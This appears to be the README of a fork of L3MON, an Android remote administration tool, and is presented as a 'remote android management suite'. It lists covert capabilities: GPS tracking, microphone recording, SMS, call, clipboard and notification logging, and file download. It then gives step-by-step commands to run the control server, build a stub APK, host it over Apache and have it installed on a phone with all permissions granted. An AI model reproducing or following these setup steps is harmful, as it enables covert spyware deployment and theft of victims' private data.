<p align="center">
<img src="https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>



## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server
##cmd
network in bridge 
-  `git clone https://github.com/BLACKHATHACKER0802/-D3VL-L3MON.git`
-  `cd L3MON`
-  `apt update`
-  `apt-get upgrade -y`
-  `sudo apt-get install openjdk-8-jre`
-  `sudo apt-get install nvidia-openjdk-8-jre`
-  `apt-get update && apt-get install apt-file -y && apt-file update && apt-get install software-properties-common`
-  `sudo apt-get install openjdk-8-jdk`
-  `export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"`
-  `update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java" 3`
-  `update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/java-8-openjdk-amd64/bin/javac" 3`
-  `sudo update-alternatives --config java`
select jre 8
-  `apt install npm -y`
yes
-  `npm install pm2 -g`
-  `cd server`
-  `npm install`
-  `pm2 start index.js`
-  `pm2 startup`
-  `pm2 stop index`
-  `gedit maindb.json`
username - your name 
open browser and search MD5 hash generator and generate your password
password - copy&paste your MD5 hash password then save
-  `pm2 restart all`
connect phone to same network 
-  `ifconfig`copy your ip address paste to below server ip
-  `http://<SERVER IP>:22533`\
go to build.apk and paste your ip address then build
-  `cd assets`
-  `cd webpublic`
-  `sudo cp build.s.apk /var/www/html`
-  `sudo systemctl start apache2.service`
on phone - open browser and paste your ip address like ip address/build.s.apk
install from browser
open apk and allow all permission
## Installation 
1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that dont use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract the latest release from [HERE](https://github.com/D3VL/L3MON/releases/)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run L3MON on startup

6. Set a Username & Password
    1. Stop L3MON `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:22533`
